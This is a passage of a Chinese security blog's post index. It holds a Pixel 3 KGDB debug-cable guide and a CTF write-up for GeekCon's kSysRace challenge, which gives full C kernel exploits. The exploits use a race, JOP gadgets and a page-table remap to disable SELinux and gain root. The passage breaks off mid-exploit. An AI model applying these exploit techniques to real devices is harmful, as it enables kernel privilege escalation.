[{"title":"为 pixel3 制作一根 KGDB 调试线","url":"/2023/11/01/231101-pixel3-debug-cable/","content":"\n\n\n\n\n关于android真机的调试，网络上的资料并不多。之前复现漏洞时，看见过一些大佬用printk来调试，这是个好方法（毕竟linus大神都用printk）。但是如果我不想频繁地添加printk代码，然后一遍遍重新编译内核，有没有其他办法呢？\n\n在搜索过程中，发现有两种基于KGDB的调试方法：\n\n1. **制作调试线接出串口**：本质是谷歌在pixel系列的手机上，将高通芯片上uart引出到手机的type-c接口。\n\n   最早介绍该方法的文章：[KGDB on Android: Debugging the kernel like a boss](https://web.archive.org/web/20150823121007/http://www.contextis.com/resources/blog/kgdb-android-debugging-kernel-boss/)\n\n   关于如何制作调试线：\n\n   ​\t\t[**How To Make Your Own Pixel 2, Pixel 3 or Pixel 4 Debugging Cable**](https://github.com/Peter-Easton/android-debug-cable-howto/blob/master/README.md)\n\n   ​\t\t[Enabling the Serial Port (or Console, UART) on Google Pixel Phones](https://blog.bacon.dev/2020/10/enabling-serial-port-or-console-uart-on.html)\n\n   关于如何结合kgdb和调试线：\n\n   ​\t\t[**screwer-kgdb-android**](https://github.com/screwer/kgdb-android)\n\n2. **将USB口强转为串口**\n\n   英文原文：[Practical Android Debugging Via KGDB](https://www.trendmicro.com/en_us/research/17/a/practical-android-debugging-via-kgdb.html)\n\n   涉及代码：[KernelDebugOnNexus6P](https://github.com/jacktang310/KernelDebugOnNexus6P/tree/master#kerneldebugonnexus6p)\n\n   中文翻译：[【技术分享】使用KGDB实现Android内核调试](https://www.anquanke.com/post/id/85352)\n\n   ```\n   该方法在pixel1上测试失败，编译内核的过程中，被替换的 drivers/usb/dwc3/gadget.c 文件报了错。\n   ```\n\n\n\n本文记录的是第一种调试方法，涉及如下几个步骤：\n\n- 制作调试线：从手机的Type-C中接出串口信号\n- 编译userdebug版本的AOSP：开启串口的shell调试\n- 编译用于调试的内核：开启kgdb并关闭watchdog\n- 接线调试：通过串口线连接到kgdb\n\n\n\n# 制作调试线\n\npixel3 手机的type-c接口中A8和B8口（但如下淘宝买的板子上测出是A5和B5）被用作UART的收发口，将它们接出，再通过ttl转usb连接到pc即可。\n\n需要两个东西：\n\n1. type-c 测试板（公头）\n2. usb转串口线（虽然其他帖子强调需要1.8v规格的电平，但经过测试PL2303即可成功连接）\n\n![image-20231101225044924](image-20231101225044924.png?size=600)\n\n把它们连接起来，如下图（为了方便接线，我们还焊了个座）：\n\n![image-20231101205919974](image-20231101205919974.png?size=600)\n\n\n\n# 编译userdebug版本的AOSP\n\n> 只有userdebug版本的系统镜像才能在串口上拿到一个 console shell\n\n环境：ubuntu20.04虚拟机，8核，22G内存，350G SSD存储。\n\n耗时：10h左右。\n\n步骤如下：\n\n```bash\n# 下载aosp源码\nmkdir aosp_a11\ncd aosp_a11\nrepo init --depth 1 -u https://android.googlesource.com/platform/manifest -b android-11.0.0_r1\nrepo sync -c -j8\n\n# 下载对应的驱动 bluelinerp1a.200720.009\nmkdir temp \ncd temp\nwget https://dl.google.com/dl/android/aosp/google_devices-blueline-rp1a.200720.009-6cd41940.tgz\nwget https://dl.google.com/dl/android/aosp/qcom-blueline-rp1a.200720.009-f772c38c.tgz\ntar zxf ./google_devices-blueline-rp1a.200720.009-6cd41940.tgz && tar zxf ./qcom-blueline-rp1a.200720.009-f772c38c.tgz\n./extract \n./extract\nmv vendor ../          # 将vendor目录放入aosp源码根目录\ncd ../\n\n# 开始编译\nsource build/envsetup.sh\nlunch aosp_blueline-userdebug\nmake -j8\n# 全部编译完成后，可以使用 m/mm/mmm 进行模块编译\n```\n\n编译完成后，刷入手机，测试能否成功开机\n\n```bash\n# 在刚刚编译完成的窗口中执行（因为需要复用编译过程中用到的一些环境变量）\nadb reboot bootloader\nfastboot flashall -w\nfastboot reboot\n```\n\n开机测试手机能否正常使用，没什么问题的话，就可以编译我们自己的内核了。\n\n\n\n# 编译用于调试的内核\n\n> 主要是在内核编译选项中开启kgdb并关闭硬件的watchdog\n\n1. 下载内核源码\n\n   ```bash\n   # 下载目标分支涉及的源码文件\n   repo init -u https://android.googlesource.com/kernel/manifest -b android-msm-crosshatch-4.9-android11-qpr2\n   repo sync\n   \n   # 切换build分支版本，因为最新版本的build目录不支持build/build.sh的编译方式\n   cd build\n   git checkout f4f2d2f0665c6031f67d8c84ff98b7d22d5abac1          \n   # ps. checkout的tag是从android12的default.xml中获取的\n   ```\n\n2. 改内核编译选项\n\n   ```bash\n   cd private/msm-google\n   export ARCH=arm64      # this is the magic line\n   make b1c1_defconfig    # This sets up the config for my hardware. Yours is probably different.\n   make menuconfig\t\t\t# 更改编译选项，或直接改.config文件。更改完毕后，继续执行\n   make savedefconfig\n   cp defconfig arch/arm64/configs/b1c1_defconfig # or whatever your hardware configuration is\n   make mrproper\n   ```\n\n   config中需要\n\n   ```bash\n   # 关闭的选项  ！！！如果不关watchdog，kgdb挂上之后手机会重启！！！\n   CONFIG_MSM_WATCHDOG_V2=n      # 老版本手机\n   CONFIG_QCOM_WATCHDOG_V2=n     # 新版本手机\n   CONFIG_STRICT_MEMORY_RWX=n\n   CONFIG_MSM_WATCHDOG_CTX_PRINT=n      # 老版本手机\n   CONFIG_QCOM_WATCHDOG_CTX_PRINT=n     # 新版本手机\n   # 开启的选项\n   CONFIG_CONSOLE_POLL=y\n   CONFIG_KGDB=y\n   CONFIG_KGDB_SERIAL_CONSOLE=y\n   CONFIG_KGDB_KDB=y\n   CONFIG_KDB_KEYBOARD=y\n   CONFIG_KDB_DEFAULT_ENABLE=0x1\n   ```\n\n3. 编译内核\n\n   ```bash\n   # 编译内核\n   cd ../\n   build/build.sh\n   ```\n\n4. 改内核启动参数/proc/cmdline\n\n   编译boot.img之前，在aosp源码目录 `device/google/crosshatch` 中找到 [BoardConfig-common.mk](http://BoardConfig-common.mk)，更改 BOARD_KERNEL_CMDLINE 即可\n\n   ```bash\n   BOARD_KERNEL_CMDLINE += console=ttyMSM0,115200n8 androidboot.console=ttyMSM0 printk.devkmsg=on\n   BOARD_KERNEL_CMDLINE += msm_rtb.filter=0x237\n   [...]\n   # 改成了\n   BOARD_KERNEL_CMDLINE += console=ttyMSM0,115200n8 androidboot.console=ttyMSM0 kgdboc=ttyMSM0,115200 kgdbcon nokaslr printk.devkmsg=on\n   BOARD_KERNEL_CMDLINE += msm_rtb.filter=0x237\n   # 或者改成下面这样\n   BOARD_KERNEL_CMDLINE += console=ttyMSM0,115200n8 androidboot.console=ttyMSM0 kgdboc=ttyMSM0,115200 kgdbretry=4 nokaslr printk.devkmsg=on\n   BOARD_KERNEL_CMDLINE += msm_rtb.filter=0x237\n   ```\n\n5. 将内核镜像打包成boot.img\n\n   ```bash\n   # 进入aosp源码目录，初始化环境\n   cd ~/aosp/\n   source build/envsetup.sh\n   lunch aosp_blueline-userdebug\n   \n   # 将目标文件Image.lz4导出到环境变量\n   export TARGET_PREBUILT_KERNEL=/home/bling/pixel3/android11/out/android-msm-pixel-4.9/dist/Image.lz4\n   \n   # 编译\n   make -j4 bootimage\n   \n   # 等待编译完成，在 out/target/product/blueline/ 目录下查看生成的boot.img文件\n   \n   # 然后，进入fastboot，通过如下命令将新镜像刷入手机即可\n   adb reboot bootloader\n   fastboot flash boot out/target/product/blueline/boot.img\n   fastboot oem uart enable\t# 启用uart串口调试功能\n   fastboot reboot\n   ```\n\n6. 刷入新的ko文件，修复触屏不好使等问题\n\n   ```bash\n   adb root \n   adb remount -R     # adb remount & adb reboot\n   adb push out/android-msm-pixel-4.9/dist/*.ko /vendor/lib/modules/\n   adb reboot\n   ```\n\n\n\n# 接线调试\n\n接好线后，可以先看看串口输出和输入功能是否正常\n\n```bash\nsudo minicom --device /dev/ttyUSB0\n```\n\n如下图说明是正常的\n\n![image-20231101210447849](image-20231101210447849.png)\n\n然后，关闭minicom界面，不然 /dev/ttyUSB0 被占住，后续gdb调试时无法使用它。\n\n接下来的步骤中，由于我们没有把type-c的USB功能引出，产生了一个冲突：当调试线占用了type-c接口时，我们还需要通过adb shell中执行一条命令用来触发kgdb。\n\n为了解决这个矛盾，我们需要提前设置好无线adb，执行如下几个步骤：\n\n- 设置无线adb\n\n  ```\n  adb tcpip 5555\n  adb connect 192.168.40.123:5555\n  adb shell\n  blueline:/ $ su\n  blueline:/ #\n  ```\n\n- adb shell 中执行命令触发kgdb（无线连接）\n\n  ```\n  blueline:/ # echo g > /proc/sysrq-trigger\n  ```\n\n- linux pc 主机中使用gdb调试（调试线连接）—— **这一步跟上一步尽量别间隔太长时间**\n\n  ```\n  su root\n  gdb-multiarch\n  (gdb) set architecture aarch64\n  (gdb) file ./vmlinux\n  (gdb) set serial baud 115200\n  (gdb) target remote /dev/ttyUSB0\n  ```\n\n\n\n\n\n断下情况如图：\n\n![image-20231101224034942](image-20231101224034942.png)\n\n![image-20231101231040773](20231101231855.jpg)\n\n但是，有几个问题，暂时不知道原因：\n\n- 可以设置一个断点，然后`c`继续执行，但是单步`si`就会崩溃重启\n- 同时设置多个断点时，`c`继续执行就不生效了\n\n\n\n# 参考文章\n\n[android手机调通kgdb调试](https://blog.csdn.net/zhaojidong6020/article/details/50929454)\n\n[高通uart调试总结](https://blog.csdn.net/weixin_38233274/article/details/95204486)\n\n[Building a Nexus 4 UART Debug Cable](https://web.archive.org/web/20141018021239/http://www.accuvant.com/blog/building-a-nexus-4-uart-debug-cable)\n\n[Android: Kernel Debugging with KGDB](https://stackoverflow.com/questions/4937322/android-kernel-debugging-with-kgdb)\n\n[Google Pixel UART kernel debug cable](https://duasynt.com/blog/google-pixel-uart-serial-cable)\n\n[kgdb notes](https://gist.github.com/calebccff/50d32bc879c26001971e2dba20fe1b5e#kgdb-notes)\n\n[Serial debugging:Cable schematics](https://wiki.postmarketos.org/wiki/Serial_debugging:Cable_schematics)\n\n[aosp 学习记录](http://www.ramlife.org/2021/09/01/400.html)\n\n[How to specify a custom defconfig file in Android 10 Kernel compilation](https://xdaforums.com/t/how-to-specify-a-custom-defconfig-file-in-android-10-kernel-compilation.4080241/)\n","tags":["android","pixel"],"categories":["基础技能"]},{"title":"GeekCon AVSS 2023 Qualifier - kSysRace","url":"/2023/09/18/230918-kSysRace/","content":"\n\n\n![image-20230918184107056](image-20230918184107056.png)\n\n\n\n附件：[KV4.tar.gz](KV4.tar.gz)\n\n\n\n# 漏洞分析\n\n漏洞点代码精简如下：\n\n```c\nasmlinkage long sys_race(void __user *userkey, char __user *buffer, unsigned long len, char __user *userhmac)\n{\n    [...]\n    ret = get_user(ssize, &((struct mystruct *)userkey)->size);\n\t[...]\n\n    if (ssize != 0x20 && ssize != 0x10) {         // 第一次取值userkey->size，检查ssize需为0x20和0x10其中之一\n        printk(KERN_INFO \"Invalid key size: 0x%x\\\\n\", ssize);\n        return -1;\n    }\n\t[...]\n    st = memdup_user(userkey, ssize + sizeof(size_t));    \n\n    key_len = st->size;\t\t\t\t\t\t\t // 第二次取值userkey->size\n\n    if (key_len == 0x10) {\t\t\t\t\t\t // 第二次检查key_len，分别进入0x10和0x20两个分支处理\n        ret = handle_128(st->buffer, ssize, ptext, len, hmac);\n    } else if (key_len == 0x20) {\n        ret = handle_256(st->buffer, ssize, ptext, len, hmac);\n    } else {\n        printk(KERN_ERR \"ERROR key_len\\\\n\");\n        return -1;\n    }\n\t[...]\n    return ret;\n}\n```\n\n第一次和第二次取值之间，用户空间的`userkey->size` 可能被更改。于是构造ssize为0x20，而key_len为0x10的场景，进入 handle_128() 函数中处理，导致越界写内核函数指针。\n\n```c\nlong handle_128(char *key, size_t keylen, unsigned char * ptext, unsigned long len, unsigned char *hmac) {\n\t[...]\n    st128 = cryptoctx128_init(key, keylen);     // key_len是0x20\n    rk = st128->funcs.cipherinit(128);          \n    ret = st128->funcs.checkentropy(st128->key, st128->funcs.getbits(st128)/8);   // 触发函数指针\n    [...]\n    for (i = 0; i < len; i+=8) {\n\t\t  st128->funcs.cipher(ptext + i, ptext + i, rk);        // 触发函数指针\n    }\n\t\t[...]\n}\n\nstruct cryptoctx128 * cryptoctx128_init(char *key, size_t keylen) {\n    struct cryptoctx128 * st128 = kmalloc(sizeof(struct cryptoctx128), GFP_KERNEL);\n    [...]\n    st128->funcs.getbits = cryptoctx_getbits;\n    [...]\n\t\tst128->funcs.cipher = IDEA_ecb_encrypt;\n\t\t[...]\n    memcpy(st128->key, key, keylen);\t// key_len是0x20，越界写，写到了cryptoctx128->funcs中的函数指针getbits和cipher\n    return st128;\n}\n\nstruct cryptoctx128 {\n    size_t bits;\n    char roundkey[0x80];\n    char  key[0x10];            // 只有0x10大小\n    struct cryptofuncs funcs;\n};\n\nstruct cryptofuncs {\n    size_t (*getbits)(void * p);\n    void (*cipher)(uint8_t *in, uint8_t *out, uint8_t *w);     // 前面两个可能被覆盖\n    uint8_t *(*cipherinit)(size_t key_size);\n    void (*cipherfini)(uint8_t *w);\n    int (*checkentropy)(uint8_t *key, size_t len);\n    void (*key_expansion)(uint8_t *key, uint8_t *w);\n    long (*hmac)(unsigned char * message, size_t message_len, unsigned char *hmac);\n    size_t (*fini)(void * p);\n};\n```\n\n\n\n题目提示中给了触发poc：\n\n```c\n#include <unistd.h>\n#include <signal.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/prctl.h>\n#include <linux/keyctl.h>\n#include <sys/ipc.h>\n#include <sys/msg.h>\n#include <sched.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <sched.h>\n#include <unistd.h>\n\n\nstruct mystruct {\n    size_t  size;\n    char  buffer[0];\n};\n\nstatic unsigned int try_num = 1000;\nstatic unsigned int dest_num = 0x20;\nstatic unsigned int evil_value = 0x10;\n\nint trigger_ready = 0;\nint flipping_ready = 0;\nint finish = 0;\nunsigned int interval = 0;\n\nvoid flipping_thread(struct mystruct * st1)\n{\t\n\twhile(!finish) {\n\t\tflipping_ready = 1;/* tell the trigger thread that the flipping thread is ready */\n\t\t\n\t\twhile(!trigger_ready) {}/* waiting for the trigger thread ready */\n\t\tusleep(interval);\n\t\tst1->size = evil_value;\n\t\tinterval+=10;\n\t\tif(interval > 1000)\n\t\t\tinterval = 0;\n\t\t\n\t\tflipping_ready = 0;\n\t}\t\n\t\n}\n\n\n#define buffersize 0x10000\n\nunsigned long seed = 1;\nconst unsigned long A = 1103515245;\nconst unsigned long C = 12345;\nconst unsigned long M = 2147483648;\nunsigned long nextRandom() {\n    seed = (A * seed + C) % M;\n    return seed;\n}\n\nint main(int argc, char *argv[]){\n\tpthread_t t1;\n\tint i;\n\n\tint digestsize = 0x100;\n\tstruct mystruct * st = malloc(sizeof(struct mystruct) + 0x20);\n\t// memset(st, 0xAA, sizeof(struct mystruct) + 0x20);\n    for (int i=0; i < sizeof(struct mystruct) + 0x20; i++) {\n        *((unsigned char *)st + i) = (unsigned char)nextRandom();\n    }\n\n\tchar * buff = malloc(buffersize);\n\tchar * digest = malloc(digestsize);\n\n\tst->size = dest_num;\n\n\tmemset(buff, 0, buffersize);\n\tmemset(digest, 0, digestsize);\n\n\tpthread_create(&t1, NULL, flipping_thread, st);\n\n\tfor (i = 0; i < try_num; i++) {\n\t\n\t\twhile(!flipping_ready){} /* Wait for the flipping thread ready */\n\t\t// memcpy(buff, payload, sizeof(payload));\n\t\tprintf(\"Try for the %d time\\n\", i);\n\t\ttrigger_ready = 1; /* Tell the flipping thread that the trigger thread is ready*/\n\t\tint ret = syscall(604, st, buff, buffersize, digest);\n\t\tif (ret < 0)\n\t\t\tprintf(\"Execute syscall failed.\\n\");\t\n\n\t\t/* reset the values for the next try */\n\t\ttrigger_ready = 0;\n\t\tst->size = dest_num;\n\n\t}\n\t\n\tfinish = 1;\n\n\tpthread_join(t1, NULL);\n\n\n\treturn 0;\n}\n```\n\n\n\n# 漏洞利用\n\n控制流劫持有两个点：\n\n```c\nlong handle_128(char *key, size_t keylen, unsigned char * ptext, unsigned long len, unsigned char *hmac) {\n\t[...]\n    st128 = cryptoctx128_init(key, keylen);     // key_len是0x20\n    rk = st128->funcs.cipherinit(128);          \n    ret = st128->funcs.checkentropy(st128->key, st128->funcs.getbits(st128)/8);  // 点1：触发函数指针getbits\n    [...]\n    for (i = 0; i < len; i+=8) {\n\t\t  st128->funcs.cipher(ptext + i, ptext + i, rk);     // 点2：触发函数指针cipher\n    }\n\t\t[...]\n}\n```\n\n第二个点的ptext内容是用户态可控的，对于进一步利用更有帮助，所以选了这个点。\n\n控制流劫持后，通过JOP达成一次任意地址写，可以想到最简便的方法是KSMA。\n\n\n\n## android 7\n\n> 内核版本：linux 3.10.0\n\n本题环境中未开启PAN，可以将部分JOP数据布置到用户态。找到三条gadget如下：\n\n```\nldr x3, [x0, #0x18] ; mov x22, x2 ; ldr x20, [x0] ; ldr x23, [x0, #0x10] ; cbz x3, #0xffffffc0003a4c24 ; blr x3\n\nldr x2, [x0, #0x60] ; ldr x22, [x0, #0x70] ; cbz x2, #0xffffffc0001a8354 ; mov x0, x20 ; mov x1, x23 ; blr x2\n\nstr x23, [x22] ; ldr x3, [x20, #0x28] ; mov x0, x20 ; mov x1, x23 ; mov w2, w26 ; ldr x3, [x3, #0x30] ; blr x3\n```\n\n最后返回到 `handle_128()` 函数的返回代码 `0xFFFFFFC0000C33A4` 处。\n\nexp如下：\n\n```c\n#include <unistd.h>\n#include <signal.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/prctl.h>\n#include <linux/keyctl.h>\n#include <sys/ipc.h>\n#include <sys/msg.h>\n#include <sched.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <sched.h>\n#include <unistd.h>\n#include <sys/mman.h>\n\n\n#define SYS_race 604\n\nstruct mystruct {\n    size_t  size;\n    char  buffer[0];\n};\n\nstatic unsigned int try_num = 1000;\nstatic unsigned int dest_num = 0x20;\nstatic unsigned int evil_value = 0x10;\n\nint trigger_ready = 0;\nint flipping_ready = 0;\nint finish = 0;\nunsigned int interval = 0;\n\nvoid flipping_thread(struct mystruct * st1)\n{\t\n\twhile(!finish) {\n\t\tflipping_ready = 1;/* tell the trigger thread that the flipping thread is ready */\n\t\t\n\t\twhile(!trigger_ready) {}/* waiting for the trigger thread ready */\n\t\tusleep(interval);\n\t\tst1->size = evil_value;\n\t\tinterval+=10;\n\t\tif(interval > 1000)\n\t\t\tinterval = 0;\n\t\t\n\t\tflipping_ready = 0;\n\t}\t\n\t\n}\n\n#define buffersize 0x10000\n\n\n\nunsigned long swapper_pg_dir = 0xFFFFFFC00007D000;\nunsigned long d_block_addr = 0x0;\nunsigned long d_block = 0x0;\n\nvoid init_mirror(unsigned long kernel_phys, unsigned long mirror_base) {\n    int index1 = (mirror_base & 0x0000007fc0000000) >> 30; // bits[39:31]\n    d_block_addr = swapper_pg_dir + index1 * 8;  // target Table Descriptor Address\n    printf(\"d_block_addr: 0x%lx + %d x 8 = 0x%lx\\n\", swapper_pg_dir, index1, d_block_addr);\n\n    d_block = 0;\n    d_block |= 0x1 ; // Block entry\n    /* Lower attributes */\n    d_block |= (1u << 11); // bits[11], nG\n    d_block |= (1u << 10); // bits[10], AF\n    d_block |= (1u << 9); // bits[9], SH[1]\n    d_block |= 0x40; // bits[7:6], AP[2:1] = 01\n    d_block |= 0x20; // bits[5], NS\n    d_block |= 0x10; // bits[2:0], AttrIndx[2:0]\n    d_block |= (kernel_phys & 0x0000ffffc0000000); // bits[47:30], output address\n    /* Upper attributes */\n    d_block |= (1ul << 52); // bits[52], Contiguous\n    d_block |= (1ul << 53); // bits[53], PXN\n    d_block |= (1ul << 54); // bits[54], XN\n    printf(\"d_block = 0x%lx\\n\", d_block);\n}\n\n#define GADGET1 0xFFFFFFC0003A4BEC          // ldr x3, [x0, #0x18] ; mov x22, x2 ; ldr x20, [x0] ; ldr x23, [x0, #0x10] ; cbz x3, #0xffffffc0003a4c24 ; blr x3 \n#define GADGET2 0xFFFFFFC0001A82B8          // ldr x2, [x0, #0x60] ; ldr x22, [x0, #0x70] ; cbz x2, #0xffffffc0001a8354 ; mov x0, x20 ; mov x1, x23 ; blr x2\n#define GADGET3 0xffffffc000385d8c          // str x23, [x22] ; ldr x3, [x20, #0x28] ; mov x0, x20 ; mov x1, x23 ; mov w2, w26 ; ldr x3, [x3, #0x30] ; blr x3\n#define GADGET4 0xFFFFFFC0000C33A4          // handle_128() return \n\n#define IMAGE_PHYS_ADDR 0x40080000\n#define RE_MAP_ADDR 0xFFFFFFC200000000\n#define IMAGE_BASE 0xFFFFFFC000080000\n\n\nint main(int argc, char *argv[]){\n    init_mirror(IMAGE_PHYS_ADDR, RE_MAP_ADDR);\n\n    void* user_addr = mmap((void*)0x40000000, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);\n    if( user_addr == (void*)-1) err(1, \"mmap() failed\");\t\n    printf(\"mmap addr: 0x%lx\\n\", user_addr);\n\n// mystruct\n\tstruct mystruct* st = malloc(sizeof(struct mystruct) + 0x20);\n    *((unsigned long*)st->buffer)=0xe3575ca28750bdec;       // random\n    *(((unsigned long*)st->buffer)+1)=0x2355615aefbd6548;   // random\n    *(((unsigned long*)st->buffer)+2)=0xFFFFFFC0000C3060;        // cryptoctx_getbits() func\n    *(((unsigned long*)st->buffer)+3)=GADGET1;           // hijack 1\n    st->size = dest_num;\n\n    int digestsize = 0x100;\n\tchar* buff = malloc(buffersize);\n\tchar* digest = malloc(digestsize);\n\tmemset(buff, 0, buffersize);\n\tmemset(digest, 0, digestsize);\n\n// race\n\tpthread_t t1;\n\tpthread_create(&t1, NULL, flipping_thread, st);\n\n\tfor (int i = 0; i < try_num; i++) {\n\n        // gadget\n        *(unsigned long*)(buff)=user_addr;          // gadget1: x20\n        *(unsigned long*)(buff+0x10)=d_block;           // gadget1: x23(aaw value)\n        *(unsigned long*)(buff+0x18)=GADGET2;           // gadget1: x3, hijack 2 \n        *(unsigned long*)(buff+0x60)=GADGET3;           // gadget2: x2, hijack 3\n        *(unsigned long*)(buff+0x70)=d_block_addr;           // gadget2: x22(aaw address)\n        *(unsigned long*)(user_addr+0x28)=user_addr;    // gadget3: x3\n        *(unsigned long*)(user_addr+0x30)=GADGET4;          // gadget3: x3, hijack 4\n\n\t\twhile(!flipping_ready){} /* Wait for the flipping thread ready */\n\t\tprintf(\"Try for the %d time\\n\", i);\n\t\ttrigger_ready = 1; /* Tell the flipping thread that the trigger thread is ready*/\n\t\tint ret = syscall(SYS_race, st, buff, buffersize, digest);\n\t\tif (ret < 0)\n\t\t\tprintf(\"Execute syscall failed.\\n\");\t\n\n\t\t/* reset the values for the next try */\n\t\ttrigger_ready = 0;\n\t\tst->size = dest_num;\n\t}\n\t\n\tfinish = 1;\n\n\tpthread_join(t1, NULL);\t\n\n\t// int ret = syscall(SYS_race, st, buff, buffersize, digest);\n\t// if (ret < 0)\n\t// \tprintf(\"Execute syscall failed.\\n\");\t\n\n// write kernel image\n    /* selinux_enforcing*/\n    unsigned long selinux_enforcing_addr = 0xFFFFFFC0006EFA0C;\n    unsigned long selinux_enforcing_addr_new = RE_MAP_ADDR + 0x80000 + (selinux_enforcing_addr - IMAGE_BASE);\n    printf(\"selinux_enforcing_addr_new: 0x%lx\\n\", selinux_enforcing_addr_new);\n    *(int*)selinux_enforcing_addr_new = 0x0;\n\n    /* sys_setresuid*/\n    unsigned long setresuid_if_addr = 0xFFFFFFC0000ADF44;\n    unsigned long setresuid_if_addr_new = RE_MAP_ADDR + 0x80000 + (setresuid_if_addr - IMAGE_BASE);\n    *(char *)(setresuid_if_addr_new+3) = 0x34;\n    printf(\"setresuid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresuid_if_addr_new);\n\n    /* sys_setresgid*/\n    unsigned long setresgid_if_addr = 0xFFFFFFC0000AE1BC;\n    unsigned long setresgid_if_addr_new = RE_MAP_ADDR + 0x80000 + (setresgid_if_addr - IMAGE_BASE);\n    *(char *)(setresgid_if_addr_new+3) = 0x35;\n    printf(\"setresgid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresgid_if_addr_new);\n\n    setresuid(0,0,0);\n    setresgid(0,0,0);\n\n    system(\"/system/bin/sh\");\n\n\treturn 0;\n}\n```\n\n\n\n\n\n## android 8\n\n> 内核版本：linux 3.18.94\n\n本题环境中未开启PAN，利用方法同android 7，找到如下gadget：\n\n```\nldr x3, [x0, #0x18] ; mov x22, x2 ; ldr x20, [x0] ; ldr x23, [x0, #0x10] ; cbz x3, #0xffffffc0004f0204 ; blr x3\nldr x2, [x0, #0x68] ; ldr x22, [x0, #0x78] ; cbz x2, #0xffffffc0001e3908 ; mov x0, x20 ; mov x1, x23 ; blr x2\nstr x20, [x23, #8] ; mov x1, x23 ; ldr x2, [x22, #8] ; blr x2\n```\n\n另外，为了提高race的成功率，对 flipping_thread() 函数做了更改。\n\nexp如下：\n\n```c\n#include <unistd.h>\n#include <signal.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/prctl.h>\n#include <linux/keyctl.h>\n#include <sys/ipc.h>\n#include <sys/msg.h>\n#include <sched.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <sched.h>\n#include <unistd.h>\n#include <sys/mman.h>\n\n\n#define SYS_race 604\n\nstruct mystruct {\n    volatile size_t size;\n    char  buffer[0];\n};\n\nstatic unsigned int try_num = 1000;\nstatic unsigned int dest_num = 0x20;\nstatic unsigned int evil_value = 0x10;\n\nint finish = 0;\n#define TIME_GAP 100\n\nvoid flipping_thread(struct mystruct * st1)\n{\t\n\twhile(!finish) {\n\t\tst1->size = dest_num;\n\t\tusleep(TIME_GAP);\n\t\tst1->size = evil_value;\n\t\tusleep(TIME_GAP);\n\t}\t\n\t\n}\n\n#define buffersize 0x10000\n\nunsigned long swapper_pg_dir = 0xFFFFFFC000A09000;\nunsigned long d_block_addr = 0x0;\nunsigned long d_block = 0x0;\n\nvoid init_mirror(unsigned long kernel_phys, unsigned long mirror_base) {\n    int index1 = (mirror_base & 0x0000007fc0000000) >> 30; // bits[39:31]\n    d_block_addr = swapper_pg_dir + index1 * 8;  // target Table Descriptor Address\n    printf(\"d_block_addr: 0x%lx + %d x 8 = 0x%lx\\n\", swapper_pg_dir, index1, d_block_addr);\n\n    d_block = 0;\n    d_block |= 0x1 ; // Block entry\n    /* Lower attributes */\n    d_block |= (1u << 11); // bits[11], nG\n    d_block |= (1u << 10); // bits[10], AF\n    d_block |= (1u << 9); // bits[9], SH[1]\n    d_block |= 0x40; // bits[7:6], AP[2:1] = 01\n    d_block |= 0x20; // bits[5], NS\n    d_block |= 0x10; // bits[2:0], AttrIndx[2:0]\n    d_block |= (kernel_phys & 0x0000ffffc0000000); // bits[47:30], output address\n    /* Upper attributes */\n    d_block |= (1ul << 52); // bits[52], Contiguous\n    d_block |= (1ul << 53); // bits[53], PXN\n    d_block |= (1ul << 54); // bits[54], XN\n    printf(\"d_block = 0x%lx\\n\", d_block);\n}\n\n#define GADGET1 0xffffffc0004f01cc          // ldr x3, [x0, #0x18] ; mov x22, x2 ; ldr x20, [x0] ; ldr x23, [x0, #0x10] ; cbz x3, #0xffffffc0004f0204 ; blr x3\n#define GADGET2 0xffffffc0001e3868          // ldr x2, [x0, #0x68] ; ldr x22, [x0, #0x78] ; cbz x2, #0xffffffc0001e3908 ; mov x0, x20 ; mov x1, x23 ; blr x2\n#define GADGET3 0xffffffc000149d3c          // str x20, [x23, #8] ; mov x1, x23 ; ldr x2, [x22, #8] ; blr x2\n#define GADGET4 0xFFFFFFC0000BF1D4          // handle_128() return\n\n#define IMAGE_PHYS_ADDR 0x40080000\n#define RE_MAP_ADDR 0xFFFFFFC200000000\n#define IMAGE_BASE 0xFFFFFFC000080000\n\nint main(int argc, char *argv[]){\n    init_mirror(IMAGE_PHYS_ADDR, RE_MAP_ADDR);\n\n    void* user_addr = mmap((void*)0x40000000, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);\n    if( user_addr == (void*)-1) err(1, \"mmap() failed\");\t\n\n// mystruct\n\tstruct mystruct* st = malloc(sizeof(struct mystruct) + 0x20);\n    *((unsigned long*)st->buffer)=0xe3575ca28750bdec;       // random\n    *(((unsigned long*)st->buffer)+1)=0x2355615aefbd6548;   // random\n    *(((unsigned long*)st->buffer)+2)=0xFFFFFFC0000BEE90;        // cryptoctx_getbits() func\n    *(((unsigned long*)st->buffer)+3)=GADGET1;           // hijack 1\n    st->size = dest_num;\n\n    int digestsize = 0x100;\n\tchar* buff = malloc(buffersize);\n\tchar* digest = malloc(digestsize);\n\tmemset(buff, 0, buffersize);\n\tmemset(digest, 0, digestsize);\n\n// race\n\tpthread_t t1;\n\tpthread_create(&t1, NULL, flipping_thread, st);\n\n\tfor (int i = 0; i < try_num; i++) {\n\n        // gadget\n        *(unsigned long*)(buff)=d_block;          // gadget1: x20(aaw value)\n        *(unsigned long*)(buff+0x10)=d_block_addr-0x8;           // gadget1: x23(aaw address-0x8)\n        *(unsigned long*)(buff+0x18)=GADGET2;           // gadget1: x3, hijack 2 \n        *(unsigned long*)(buff+0x68)=GADGET3;           // gadget2: x2, hijack 3\n        *(unsigned long*)(buff+0x78)=user_addr;           // gadget2: x22\n        *(unsigned long*)(user_addr+0x8)=GADGET4;          // gadget3: x2, hijack 4\n\n\t\tprintf(\"Try for the %d time\\n\", i);\n\t\tint ret = syscall(SYS_race, st, buff, buffersize, digest);\n\t\tif (ret < 0)\n\t\t\tprintf(\"Execute syscall failed.\\n\");\t\n\t\tst->size = 